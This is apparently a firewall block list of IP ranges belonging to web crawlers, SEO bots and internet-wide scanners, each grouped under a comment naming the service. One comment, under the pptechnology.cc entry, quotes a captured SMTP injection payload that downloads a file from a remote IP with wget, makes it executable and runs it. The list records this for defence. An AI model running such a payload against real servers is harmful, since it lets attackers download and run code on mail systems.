138.201.213.44/32 # cm25.debounce.io
88.99.119.227/32 # cm26.debounce.io
178.63.126.218/32 # cm27.debounce.io
178.63.126.222/32 # cm28.debounce.io
78.46.101.184/32 # cm29.debounce.io
88.99.46.197/32 # cm30.debounce.io


#199.195.252.
199.195.252.195/32 # internet-intelligence.cenixs.net.

#similarweb.com
192.187.103.112/29

#hubuco.com #trying to guess email address (loads server)
185.196.52.0/22 

#pagething.com
213.168.249.115/32 # crawler.pagething.com

#masebytes.com
217.160.142.105/32

#LightspeedSystemsCrawler
207.200.8.180/32

#Adsbot webnx
173.231.59.206/32
216.18.204.201/32

#garlik.com hosten on experian.com
185.26.92.0/23

#webmeup (hetzner hosts)
88.198.17.136/32 # ninja-crawler1.webmeup.com
176.9.4.111/32 # ninja-crawler2.webmeup.com
176.9.4.106/32 # ninja-crawler3.webmeup.com
176.9.4.102/32 # ninja-crawler4.webmeup.com
176.9.9.125/32 # ninja-crawler5.webmeup.com
176.9.4.108/32 # ninja-crawler6.webmeup.com
176.9.9.94/32 # ninja-crawler7.webmeup.com
176.9.4.105/32 # ninja-crawler8.webmeup.com
176.9.4.107/32 # ninja-crawler9.webmeup.com
176.9.1.234/32 # ninja-crawler10.webmeup.com
176.9.1.27/32 # ninja-crawler11.webmeup.com
46.4.122.197/32 # ninja-crawler12.webmeup.com
46.4.122.196/32 # ninja-crawler13.webmeup.com
176.9.5.87/32 # ninja-crawler14.webmeup.com
176.9.4.101/32 # ninja-crawler15.webmeup.com
176.9.2.212/32 # ninja-crawler16.webmeup.com
46.4.122.146/32 # ninja-crawler17.webmeup.com
78.46.93.48/32 # ninja-crawler18.webmeup.com
94.130.64.80/32 # ninja-crawler19.webmeup.com
94.130.18.162/32 # ninja-crawler20.webmeup.com
94.130.9.166/32 # ninja-crawler21.webmeup.com
94.130.9.115/32 # ninja-crawler22.webmeup.com
94.130.9.185/32 # ninja-crawler23.webmeup.com
94.130.10.89/32 # ninja-crawler24.webmeup.com
94.130.9.106/32 # ninja-crawler25.webmeup.com
94.130.66.99/32 # ninja-crawler26.webmeup.com
94.130.64.96/32 # ninja-crawler27.webmeup.com
94.130.9.116/32 # ninja-crawler28.webmeup.com
94.130.16.50/32 # ninja-crawler29.webmeup.com
94.130.18.151/32 # ninja-crawler30.webmeup.com
94.130.12.118/32 # ninja-crawler31.webmeup.com
94.130.66.60/32 # ninja-crawler32.webmeup.com
94.130.9.183/32 # ninja-crawler33.webmeup.com
94.130.18.161/32 # ninja-crawler34.webmeup.com
94.130.18.160/32 # ninja-crawler35.webmeup.com
94.130.16.31/32 # ninja-crawler36.webmeup.com
94.130.18.163/32 # ninja-crawler37.webmeup.com
178.63.13.146/32 # ninja-crawler38.webmeup.com
94.130.34.225/32 # ninja-crawler39.webmeup.com
116.202.128.228/32 # ninja-crawler40.webmeup.com
136.243.21.181/32 # ninja-crawler41.webmeup.com
168.119.4.44/32 # ninja-crawler42.webmeup.com
49.12.131.247/32 # ninja-crawler43.webmeup.com
78.46.86.157/32 # ninja-crawler44.webmeup.com
136.243.103.251/32 # ninja-crawler45.webmeup.com
136.243.104.54/32 # ninja-crawler46.webmeup.com
188.40.110.183/32 # ninja-crawler47.webmeup.com
78.46.62.249/32 # ninja-crawler48.webmeup.com
78.46.62.238/32 # ninja-crawler49.webmeup.com


#swordsec.com.
#165.232.76.
165.232.76.57/32 # scanner11-swordsec.com.
165.232.76.142/32 # scanner5-swordsec.com.
#165.232.74.
165.232.74.18/32 # scanner55-swordsec.com.
#165.232.70.
165.232.70.131/32 # scanner49-swordsec.com.
165.232.70.143/32 # scanner69-swordsec.com.
#165.232.64.
165.232.64.22/32 # scanner3-swordsec.com.
165.232.64.78/32 # scanner16-swordsec.com.

#netscopebd.com
103.77.188.0/22

#acmelabs.space ???
185.244.195.243/32 # agent: Synapse/1.17.0

#socradar.com
45.79.173.230/32 # 45.79.173.230.socradar-tchelebi-wide-scan-project.socradar.com.
172.104.75.183/32 # 172.104.75.183.socradar-tchelebi-wide-scan-project.socradar.com
172.105.9.235/32 # 172.105.9.235.socradar-tchelebi-wide-scan-project.socradar.com.
172.105.73.148/32 # 172.105.73.148.socradar-tchelebi-wide-scan-project.socradar.com.
172.105.78.101/32 # 172.105.78.101.socradar-tchelebi-wide-scan-project.socradar.com.

#scan-andrew.foma-protonmail.com
142.93.231.86/32 # 28-scan-andrew.foma-protonmail.com 
164.90.154.195/32 # 50-scan-andrew.foma-protonmail.com
128.199.94.104/32 # 64-scan-andrew.foma-protonmail.com

#toxicsecurity.network
66.70.235.104/32

#mylinkback.com
179.61.232.133/32

#bgm.io
67.205.137.170/32
147.78.66.96/32

#malquaesitum.com
45.56.78.64/32

#scanner.cydis.de
81.173.112.207/32 # scanner.cydis.de

#babbar.eu babbar.tech/crawler
62.210.188.240/32
62.210.151.70/32
62.210.149.60/32
62.210.143.10/32
62.210.188.216/32
62.210.188.218/32
62.210.188.222/32
62.210.189.2/32
62.210.149.41/32
62.210.143.6/32
62.210.139.231/32
62.210.78.76/32

#kickboxio.net 72.249.58.128 - 72.249.58.191 no idea what is it
72.249.58.128/26

#server.survivethesituation.com (don't navigate to survivethesituation.com it collects fingerprints)
199.167.151.153/32

#adbogie.com (scanning for something)
208.77.99.224/32

#security-research.org
103.196.36.41/32 # scanner1.security-research.org
103.196.36.42/32 # scanner2.security-research.org
103.196.36.43/32 # scanner3.security-research.org
103.196.36.44/32 # scanner4.security-research.org
103.196.36.45/32 # scanner5.security-research.org
103.196.36.46/32 # scanner6.security-research.org
103.196.36.47/32 # scanner7.security-research.org
103.196.36.48/32 # scanner8.security-research.org
103.196.36.49/32 # scanner9.security-research.org

#CATExplorador
85.208.22.179/32 # fc02wo02.okitup.net
85.208.22.181/32 # fc02wo06.okitup.net

#Seekport Crawler
95.216.172.193/32 # static.193.172.216.95.clients.your-server.de.
138.201.95.8/32 # static.8.95.201.138.clients.your-server.de.
159.69.113.186/32 # static.186.113.69.159.clients.your-server.de.
159.69.117.167/32 # static.167.117.69.159.clients.your-server.de.
159.69.186.191/32 # static.191.186.69.159.clients.your-server.de.

#pptechnology.cc PPTECHNOLOGY LIMITED (attacks smtp, shellcode pushing)
#signature root+${run{/bin/sht-ct"wget 45.148.10.84/ss -Osxs;chmod +x sxs;./sxs"}}
45.148.10.0/24

#sidetrade indexer bot
212.99.44.64/26 #212.99.44.64 - 212.99.44.127

#www.shorebreaksecurity.com
165.227.180.195/32 #www.shorebreaksecurity.com-1550075286381-s-1vcpu-1gb-nyc3-01.

#swascan.com
165.227.178.142/32 # assintel.swascan.com

#www.arbor-observatory.com Arbor Networks, Inc. (ARBORN)
146.88.240.0/20

#anonym.nodata.host.
185.24.233.53/32

# aihitdata.com aiHitBot
78.129.237.153/32
78.129.240.214/32
109.169.64.234/32

#internetwache.org
185.9.18.99/32
185.206.224.120/32 # no-mans-land.m247.com
185.213.154.162/32
185.217.69.123/32

#cyber.DE.
64.20.54.68/32 # server.cyber.DE.

# cyber.gi.
134.209.28.255/32 # scanner-00.cyber.gi.

#super-seo-guru.com
117.215.32.228/32
189.243.66.185/32

#----prober.okscrub.it
45.33.5.240/32

#----qmarknetwork.com
3.112.38.88/32
18.220.128.65/32

#----websafe.sk
217.145.200.43/32

#----jobboersebot
185.6.9.220/32 

#----outspoken.ca
172.105.231.199/32 # outspoken.ca

#----Not Malicious Just Tracking Down A Spammer
103.196.36.15/32

#----async.ru.
212.109.220.29/32 # async.ru.
212.109.220.47/32 # crawler-05.async.ru.
212.109.220.49/32 # crawler-04.async.ru.
212.109.220.62/32 # crawler-03.async.ru.
212.109.220.65/32 # crawler-01.async.ru.
212.109.220.72/32 # crawler-02.async.ru.

#----datanyze
#--Use pf_table_digitalocean.txt and block access to port 443 and 80

#194.58.92.235/32 #-----virusdie crawler

#------clarabot.info
37.17.172.148/32
37.17.172.149/32
37.17.172.150/32
37.17.172.151/32
37.17.172.152/32
37.17.172.153/32
37.17.172.154/32
37.17.172.155/32
37.17.172.156/32
37.17.172.157/32
37.17.172.158/32
37.17.172.159/32

#----safedns.com/searchbot
178.62.209.69/32 # digitalocean

#----domaincrawler.com
185.6.9.201/32 # domaincrawler.com
193.235.141.0/24 # Internetbolaget

#----spiderling SpiderLing
77.240.183.231/32 
147.251.51.19/32

#-----Nextcloud Server Crawler
37.157.197.17/32

#-----LightspeedSystemCrawler
207.200.8.182/32

#-----nlpproject.info research
93.113.125.89/32

#-----ampereinnotech.com
45.79.152.7/32 # jscan001.ampereinnotech.com.
80.85.86.175/32 # jscan002.ampereinnotech.com.
172.105.4.63/32 # jscan003.ampereinnotech.com.
172.105.4.227/32 # protoscan.ampereinnotech.com.
172.105.11.111/32 # jscan004.ampereinnotech.com.
45.33.70.146/32 # jscan005.ampereinnotech.com
172.105.13.165/32 # scan001.ampereinnotech.com
45.79.136.161/32 # scan002.ampereinnotech.com
139.162.247.102/32 # scan003.ampereinnotech.com

#-----semtix.cz audit bot
77.236.223.91/32 

#-----securitytestingserver.leaseweb.com
5.79.113.231/32 #securitytestingserver.leaseweb.com

#-----panscient.com crawler Panscient/1.0
72.76.221.125/32
72.79.58.112/32
100.35.75.170/32

#-----tequilaboomboom.club.
176.58.124.134/32 # tequilaboomboom.club.

#-----researcher.vps.packet.tel (super hackers :) )
194.32.117.0/24

#----------steadfastdns.net
208.100.26.233/32

#####group-ib scan
80.82.70.118/32 # group-ib.com
#93.174.93.
93.174.93.114/32 # group-ib.com.
#94.102.52.
94.102.52.28/32 # group-ib.com.
94.102.52.29/32 # group-ib.com.
94.102.52.30/32 # group-ib.com.
94.102.52.77/32 # group-ib.com.

#108.178.16.
108.178.16.152/32 # machine-10.research.com.
108.178.16.153/32 # machine-10.research.com.
108.178.16.154/32 # machine-10.research.com.
108.178.16.155/32 # machine-10.research.com.

#Secure Computing Corp. ... fka
69.164.111.192/27

#McAfeeeeeeeeee
161.69.0.0/16

#--------proxydetector.xyz
134.209.189.176/32 #  proxydetector.xyz.

#-------immuniweb.com
#64.15.129.
64.15.129.102/32 # f03.immuniweb.com.
64.15.129.105/32 # portal.immuniweb.com.
64.15.129.106/32 # f04.immuniweb.com.
64.15.129.116/32 # f17.immuniweb.com.
64.15.129.117/32 # f18.immuniweb.com.
64.15.129.118/32 # f19.immuniweb.com.
64.15.129.119/32 # f20.immuniweb.com.
64.15.129.124/32 # f09.immuniweb.com.
#70.38.27.
70.38.27.248/32 # f05.immuniweb.com.
70.38.27.252/32 # f10.immuniweb.com.
#72.55.136.
72.55.136.156/32 # f06.immuniweb.com.
72.55.136.199/32 # f07.immuniweb.com.
#192.175.111.
192.175.111.228/32 # f01.immuniweb.com.
192.175.111.229/32 # f02.immuniweb.com.
192.175.111.230/32 # www.immuniweb.com.
192.175.111.231/32 # f11.immuniweb.com.
192.175.111.233/32 # f12.immuniweb.com.
192.175.111.240/32 # f13.immuniweb.com.
192.175.111.241/32 # f14.immuniweb.com.
192.175.111.242/32 # f15.immuniweb.com.
192.175.111.243/32 # f16.immuniweb.com.
192.175.111.251/32 # mail.immuniweb.com.
192.175.111.252/32 # f08.immuniweb.com.


#--------cloud mapping experiment research@pdrlabs.net
34.204.80.175/32
52.203.176.41/32
3.85.145.96/32
3.85.191.6/32
3.87.31.145/32
3.91.37.65/32
34.226.201.106/32
34.227.82.36/32
35.153.136.219/32
54.172.55.129/32
18.206.95.217/32
18.206.195.87/32
18.209.162.232/32
18.215.239.31/32
18.232.86.186/32
34.203.194.133/32
52.91.82.156/32
52.91.251.24/32
54.196.10.119/32
54.198.159.218/32
54.80.100.149/32
54.81.179.218/32
54.159.4.223/32
54.210.151.150/32
54.227.202.24/32
18.207.198.190/32
54.165.235.131/32
100.24.30.148/32

#---------com-ocean.com
137.74.28.98/32 # instance1.com-ocean.com
217.182.143.12/32 # instance2.com-ocean.com.
149.202.176.194/32 # instance3.com-ocean.com

#---------cloudsystemnetworks.com
#209.17.97.
209.17.97.2/32 # 209.17.97.2.cloudsystemnetworks.com.
209.17.97.10/32 # 209.17.97.10.cloudsystemnetworks.com.
209.17.97.18/32 # 209.17.97.18.cloudsystemnetworks.com.
209.17.97.26/32 # 209.17.97.26.cloudsystemnetworks.com.
209.17.97.34/32 # 209.17.97.34.cloudsystemnetworks.com.
209.17.97.42/32 # 209.17.97.42.cloudsystemnetworks.com.
209.17.97.50/32 # 209.17.97.50.cloudsystemnetworks.com.
209.17.97.58/32 # 209.17.97.58.cloudsystemnetworks.com.
209.17.97.66/32 # 209.17.97.66.cloudsystemnetworks.com.
209.17.97.74/32 # 209.17.97.74.cloudsystemnetworks.com.
209.17.97.82/32 # 209.17.97.82.cloudsystemnetworks.com.
209.17.97.90/32 # 209.17.97.90.cloudsystemnetworks.com.
209.17.97.98/32 # 209.17.97.98.cloudsystemnetworks.com.
209.17.97.106/32 # 209.17.97.106.cloudsystemnetworks.com.
209.17.97.114/32 # 209.17.97.114.cloudsystemnetworks.com.
209.17.97.122/32 # 209.17.97.122.cloudsystemnetworks.com.
#209.17.96.
209.17.96.2/32 # 209.17.96.2.cloudsystemnetworks.com.
209.17.96.10/32 # 209.17.96.10.cloudsystemnetworks.com.
209.17.96.18/32 # 209.17.96.18.cloudsystemnetworks.com.
209.17.96.26/32 # 209.17.96.26.cloudsystemnetworks.com.
209.17.96.34/32 # 209.17.96.34.cloudsystemnetworks.com.
209.17.96.42/32 # 209.17.96.42.cloudsystemnetworks.com.
209.17.96.50/32 # 209.17.96.50.cloudsystemnetworks.com.
209.17.96.58/32 # 209.17.96.58.cloudsystemnetworks.com.
209.17.96.66/32 # 209.17.96.66.cloudsystemnetworks.com.
209.17.96.74/32 # 209.17.96.74.cloudsystemnetworks.com.
209.17.96.82/32 # 209.17.96.82.cloudsystemnetworks.com.
209.17.96.90/32 # 209.17.96.90.cloudsystemnetworks.com.
209.17.96.98/32 # 209.17.96.98.cloudsystemnetworks.com.
209.17.96.106/32 # 209.17.96.106.cloudsystemnetworks.com.
209.17.96.114/32 # 209.17.96.114.cloudsystemnetworks.com.
209.17.96.122/32 # 209.17.96.122.cloudsystemnetworks.com.
209.17.96.130/32 # 209.17.96.130.cloudsystemnetworks.com.
209.17.96.138/32 # 209.17.96.138.cloudsystemnetworks.com.
209.17.96.146/32 # 209.17.96.146.cloudsystemnetworks.com.
209.17.96.154/32 # 209.17.96.154.cloudsystemnetworks.com.
209.17.96.162/32 # 209.17.96.162.cloudsystemnetworks.com.
209.17.96.170/32 # 209.17.96.170.cloudsystemnetworks.com.
209.17.96.178/32 # 209.17.96.178.cloudsystemnetworks.com.
209.17.96.186/32 # 209.17.96.186.cloudsystemnetworks.com.
209.17.96.194/32 # 209.17.96.194.cloudsystemnetworks.com.
209.17.96.202/32 # 209.17.96.202.cloudsystemnetworks.com.
209.17.96.210/32 # 209.17.96.210.cloudsystemnetworks.com.
209.17.96.218/32 # 209.17.96.218.cloudsystemnetworks.com.
209.17.96.226/32 # 209.17.96.226.cloudsystemnetworks.com.
209.17.96.234/32 # 209.17.96.234.cloudsystemnetworks.com.
209.17.96.242/32 # 209.17.96.242.cloudsystemnetworks.com.
209.17.96.250/32 # 209.17.96.250.cloudsystemnetworks.com.

#------------you-ve-been-scanned-from.space
185.100.87.177/32 # you-ve-been-scanned-from.space

#------------gdnplus.com
170.130.187.34/32
104.140.148.58/32
104.140.188.0/24 # 683b217.rederatural.com Malicious activity
104.206.128.0/24
104.140.148.0/24 # serverhub

#--------------cybergreen.net.
#52.73.169.
52.73.169.169/32 # scanner2.scanning.cybergreen.net.
#54.249.206.
54.249.206.188/32 # scanner3.scanning.cybergreen.net.
#52.211.122.
52.211.122.16/32 # scanner1.scanning.cybergreen.net.

#----------------pentest-tools.com
#139.162.209.
139.162.209.251/32 # scanx4.pentest-tools.com.
#139.162.202.
139.162.202.208/32 # scanx2.pentest-tools.com.
#139.162.192.
139.162.192.40/32 # scanx8.pentest-tools.com.
#139.162.209.
139.162.209.251/32 # scanx4.pentest-tools.com.
#88.80.191.
88.80.191.29/32 # scanx1.pentest-tools.com.
#212.71.244.
212.71.244.176/32 # scanx3.pentest-tools.com.
#212.71.255.
212.71.255.152/32 # scanx5.pentest-tools.com.
#176.58.123.
176.58.123.114/32 # scanx6.pentest-tools.com.
#178.79.150.
178.79.150.162/32 # scanx7.pentest-tools.com.
#139.162.224.
139.162.224.195/32 # scanx9.pentest-tools.com.
#109.74.197.
109.74.197.184/32 # scanx10.pentest-tools.com.
#178.79.128.
178.79.128.250/32 # scanx11.pentest-tools.com.

#--------sorengard.com
#94.102.59.
94.102.59.57/32 # research.sorengard.com.
94.102.59.58/32 # research.sorengard.com.
94.102.59.59/32 # research.sorengard.com.
#89.248.174.
89.248.174.141/32 # research.sorengard.com.
#198.8.88.
198.8.88.129/32 # research.sorengard.com.
198.8.88.130/32 # research.sorengard.com.
198.8.88.131/32 # research.sorengard.com.
198.8.88.132/32 # research.sorengard.com.
198.8.88.133/32 # research.sorengard.com.
198.8.88.134/32 # research.sorengard.com.
198.8.88.135/32 # research.sorengard.com.
198.8.88.136/32 # research.sorengard.com.
198.8.88.137/32 # research.sorengard.com.
198.8.88.138/32 # research.sorengard.com.
198.8.88.139/32 # research.sorengard.com.
198.8.88.140/32 # research.sorengard.com.
198.8.88.141/32 # research.sorengard.com.
198.8.88.142/32 # research.sorengard.com.
198.8.88.143/32 # research.sorengard.com.
198.8.88.144/32 # research.sorengard.com.
198.8.88.145/32 # research.sorengard.com.
198.8.88.146/32 # research.sorengard.com.
198.8.88.147/32 # research.sorengard.com.
198.8.88.148/32 # research.sorengard.com.
198.8.88.149/32 # research.sorengard.com.
198.8.88.150/32 # research.sorengard.com.
198.8.88.151/32 # research.sorengard.com.
198.8.88.152/32 # research.sorengard.com.
198.8.88.153/32 # research.sorengard.com.
198.8.88.154/32 # research.sorengard.com.
198.8.88.155/32 # research.sorengard.com.
198.8.88.156/32 # research.sorengard.com.
198.8.88.157/32 # research.sorengard.com.
198.8.88.158/32 # research.sorengard.com.

#---------orange.scan.earth
89.248.174.203/32 # 203.174.248.89.in-addr.arpa domain name pointer orange.scan.earth.

#---------proxyblocker.org
89.248.172.90/32 # defiant.proxyblocker.org.
93.174.93.218/32 # discovery.proxyblocker.org.

#----------threatsinkhole.com
172.104.242.173/32 # winnti-scanner-victims-will-be-notified.threatsinkhole.com.
172.105.89.161/32 # implant-scanner-victims-will-be-notified.threatsinkhole.com.

#----------helsecert.no
172.104.247.203/32 # scanner03.helsecert.no.

#----------similartech.com/smtbot
34.234.54.252/32

#-----------project25499.com.
#98.143.148.
98.143.148.107/32 # scanner01.project25499.com.
98.143.148.135/32 # scanner05.project25499.com.
98.143.148.193/32 # scanner07.project25499.com.
#155.94.254.
155.94.254.7/32 # scanner06.project25499.com.
155.94.254.133/32 # scanner02.project25499.com.
155.94.254.143/32 # scanner03.project25499.com.
#155.94.222.
155.94.222.12/32 # scanner04.project25499.com.
#157.230.216.
157.230.216.203/32 # NXDOMAIN (scanner01.project25499.com)
#157.245.70.
157.245.70.127/32 # NXDOMAIN (scanner02.project25499.com)
#68.183.188.
68.183.188.21/32 # NXDOMAIN (scanner03.project25499.com)
#159.65.121.
159.65.121.162/32 # NXDOMAIN (scanner04.project25499.com)
#167.99.187.
167.99.187.122/32 # NXDOMAIN (scanner05.project25499.com)

#-----------fake css-security.com/certificatespider/ hosted by microsoft
137.116.71.170/32

#-----------megaindex.ru
78.46.161.81/32
176.9.41.28/32
176.9.146.74/32

#-----------applebot.com
17.58.96.0/21
17.58.104.0/24

#-----------erratasec.com
#209.126.230.
209.126.230.66/32 # vm-host.erratasec.com.
209.126.230.69/32 # portal.erratasec.com.
209.126.230.70/32 # internetsurvey-1.erratasec.com.
209.126.230.71/32 # internetsurvey-2.erratasec.com.
209.126.230.72/32 # internetsurvey-3.erratasec.com.
209.126.230.73/32 # internetsurvey-4.erratasec.com.
209.126.230.74/32 # internetsurvey-5.erratasec.com.
209.126.230.76/32 # internetsurvey-7.erratasec.com.
209.126.230.77/32 # internetsurvey-8.erratasec.com.
209.126.230.78/32 # internetsurvey-9.erratasec.com.

#-----------http://commoncrawl.org (except amazon)
38.107.191.66/31
38.107.191.68/30
38.107.191.72/29
38.107.191.80/28
38.107.191.96/28
38.107.191.112/29
18.204.227.250/32

#--------dataprovider.com
167.114.209.28/32 # spider-1.lipperhey.com
167.114.209.38/32 # spider-2.lipperhey.com
192.99.150.97/32 # spider-3.lipperhey.com
142.4.218.236/32 # spider-4.lipperhey.com
142.4.218.156/32 # spider-5.lipperhey.com
167.114.174.95/32 # spider-6.lipperhey.com
167.114.172.225/32 # spider-7.lipperhey.com
167.114.172.224/32 # spider-8.lipperhey.com
167.114.172.223/32 # spider-9.lipperhey.com
192.99.44.141/32 # spider-10.lipperhey.com
158.69.225.33/32 # spider-11.lipperhey.com
158.69.225.34/32 # spider-12.lipperhey.com
158.69.225.35/32 # spider-13.lipperhey.com
158.69.225.36/32 # spider-14.lipperhey.com
158.69.225.37/32 # spider-15.lipperhey.com
167.114.65.240/32 # spider-16.lipperhey.com
167.114.117.176/32 # spider-17.lipperhey.com
158.69.26.144/32 # spider-18.lipperhey.com
158.69.26.193/32 # spider-19.lipperhey.com
158.69.27.211/32 # spider-20.lipperhey.com
167.114.158.57/32 # spider-21.lipperhey.com
167.114.157.79/32 # spider-22.lipperhey.com
144.217.66.151/32 # spider-23.lipperhey.com
192.99.47.111/32 # spider-24.lipperhey.com
158.69.127.133/32 # spider-25.lipperhey.com
158.69.54.207/32 # spider-26.lipperhey.com
158.69.116.77/32 # spider-27.lipperhey.com
158.69.116.79/32 # spider-28.lipperhey.com
158.69.116.60/32 # spider-29.lipperhey.com
158.69.117.141/32 # spider-30.lipperhey.com
158.69.27.222/32 # spider-31.lipperhey.com
158.69.26.125/32 # spider-32.lipperhey.com
144.217.71.103/32 # spider-33.lipperhey.com
144.217.73.217/32 # spider-34.lipperhey.com
144.217.73.132/32 # spider-35.lipperhey.com
51.79.16.45/32 # spider-36.lipperhey.com
51.161.115.91/32 # spider-37.lipperhey.com
51.161.13.232/32 # spider-38.lipperhey.com
51.161.13.233/32 # spider-39.lipperhey.com
51.161.13.235/32 # spider-40.lipperhey.com
51.161.13.234/32 # spider-41.lipperhey.com
51.161.115.121/32 # spider-42.lipperhey.com
51.161.115.120/32 # spider-43.lipperhey.com
51.161.115.122/32 # spider-44.lipperhey.com
51.83.67.42/32 # spider-45.lipperhey.com
51.222.41.44/32 # spider-46.lipperhey.com
#95.211.135.
95.211.135.133/32 # lipperhey.com.
95.211.135.179/32 # lipperhey.com.
#51.77.246.
51.77.246.67/32 # kube-11.dataprovider.com.
51.77.246.68/32 # kube-12.dataprovider.com.
51.77.246.199/32 # kube-07.dataprovider.com.
51.77.246.200/32 # kube-05.dataprovider.com.
51.77.246.201/32 # kube-06.dataprovider.com.
51.77.246.204/32 # kube-08.dataprovider.com.
51.77.246.205/32 # kube-09.dataprovider.com.
51.77.246.206/32 # kube-10.dataprovider.com.
#51.77.129.
51.77.129.151/32 # classifiers-2.dataprovider.com.
51.77.129.159/32 # kube-01.dataprovider.com.
51.77.129.165/32 # kube-02.dataprovider.com.
51.77.129.167/32 # kube-04.dataprovider.com.
51.77.129.168/32 # kube-03.dataprovider.com.
#spider-0x.dataprovider
51.222.43.127/32 # spider-01.dataprovider.com
51.222.43.125/32 # spider-02.dataprovider.com
51.222.43.126/32 # spider-03.dataprovider.com
51.222.43.124/32 # spider-04.dataprovider.com
51.222.43.122/32 # spider-05.dataprovider.com
51.222.43.123/32 # spider-06.dataprovider.com
54.39.243.186/32 # spider-07.dataprovider.com
54.39.243.183/32 # spider-08.dataprovider.com
54.39.243.184/32 # spider-09.dataprovider.com
#scanning-the-internet-for-good.dataprovider.com.
217.21.193.0/25
#crawl-149-56-150-140.dataproviderbot.com
149.56.150.0/24
#crawl-144-217-135-135.dataproviderbot.com.
144.217.135.0/24

#-----www.webdepozit.sk heritrix/3.2.0
193.87.33.0/27
193.87.33.32/29

#-----semrush.com
#46.229.168.
46.229.168.129/32 # crawl1.bl.semrush.com.
46.229.168.130/32 # crawl2.bl.semrush.com.
46.229.168.131/32 # crawl3.bl.semrush.com.
46.229.168.132/32 # crawl4.bl.semrush.com.
46.229.168.133/32 # crawl5.bl.semrush.com.
46.229.168.134/32 # crawl6.bl.semrush.com.
46.229.168.135/32 # crawl7.bl.semrush.com.
46.229.168.136/32 # crawl8.bl.semrush.com.
46.229.168.137/32 # crawl9.bl.semrush.com.
46.229.168.138/32 # crawl10.bl.semrush.com.
46.229.168.139/32 # crawl11.bl.semrush.com.
46.229.168.140/32 # crawl12.bl.semrush.com.
46.229.168.141/32 # crawl13.bl.semrush.com.
46.229.168.142/32 # crawl14.bl.semrush.com.
46.229.168.143/32 # crawl15.bl.semrush.com.
46.229.168.144/32 # crawl16.bl.semrush.com.
46.229.168.145/32 # crawl17.bl.semrush.com.
46.229.168.146/32 # crawl18.bl.semrush.com.
46.229.168.147/32 # crawl19.bl.semrush.com.
46.229.168.148/32 # crawl20.bl.semrush.com.
46.229.168.149/32 # crawl21.bl.semrush.com.
46.229.168.150/32 # crawl22.bl.semrush.com.
46.229.168.151/32 # crawl23.bl.semrush.com.
46.229.168.152/32 # crawl24.bl.semrush.com.
46.229.168.153/32 # crawl25.bl.semrush.com.
46.229.168.154/32 # crawl26.bl.semrush.com.
46.229.168.155/32 # crawl27.bl.semrush.com.
46.229.168.156/32 # crawl28.bl.semrush.com.
46.229.168.157/32 # crawl29.bl.semrush.com.
46.229.168.158/32 # crawl30.bl.semrush.com.
46.229.168.161/32 # crawl31.bl.semrush.com.
46.229.168.162/32 # crawl32.bl.semrush.com.
46.229.168.163/32 # crawl33.bl.semrush.com.
46.229.168.164/32 # crawl34.bl.semrush.com.
46.229.168.165/32 # crawl35.bl.semrush.com.
46.229.168.166/32 # crawl36.bl.semrush.com.
46.229.168.167/32 # crawl37.bl.semrush.com.
46.229.168.168/32 # crawl38.bl.semrush.com.
46.229.168.169/32 # crawl39.bl.semrush.com.
46.229.168.170/32 # crawl40.bl.semrush.com.
46.229.168.171/32 # crawl41.bl.semrush.com.
46.229.168.172/32 # crawl42.bl.semrush.com.
46.229.168.173/32 # crawl43.bl.semrush.com.
46.229.168.174/32 # crawl44.bl.semrush.com.
46.229.168.175/32 # crawl45.bl.semrush.com.
46.229.168.176/32 # crawl46.bl.semrush.com.
46.229.168.177/32 # crawl47.bl.semrush.com.
46.229.168.178/32 # crawl48.bl.semrush.com.
46.229.168.179/32 # crawl49.bl.semrush.com.
46.229.168.180/32 # crawl50.bl.semrush.com.
46.229.168.181/32 # crawl51.bl.semrush.com.
46.229.168.182/32 # crawl52.bl.semrush.com.
46.229.168.183/32 # crawl53.bl.semrush.com.
46.229.168.184/32 # crawl54.bl.semrush.com.
46.229.168.185/32 # crawl55.bl.semrush.com.
46.229.168.186/32 # crawl56.bl.semrush.com.
46.229.168.187/32 # crawl57.bl.semrush.com.
46.229.168.188/32 # crawl58.bl.semrush.com.
46.229.168.189/32 # crawl59.bl.semrush.com.
46.229.168.190/32 # crawl60.bl.semrush.com.
46.229.161.128/25 # nxdom
85.208.96.0/22 # bot.semrush.com AS209366 mnt-cy-semrush-1
185.191.171.0/24 # bot.semrush.com.


#-----ispsystem.net
92.63.111.27/32 # scanner3.ispsystem.net.
213.159.213.2/32 # free.msk.ispsystem.net.
213.159.213.137/32 # scanner1.ispsystem.net.
213.159.213.156/32 # dcimgr-trifonov.ispsystem.net.
213.159.213.236/32 # scanner4.ispsystem.net.

#-----ampereinnotech.com
45.79.168.138/32 # dns.scan.ampereinnotech.com.

#-----dotbot www.opensiteexplorer.org
216.244.66.199/32
100.25.203.196/32

#-----www.phenome.ca
172.105.23.36/32

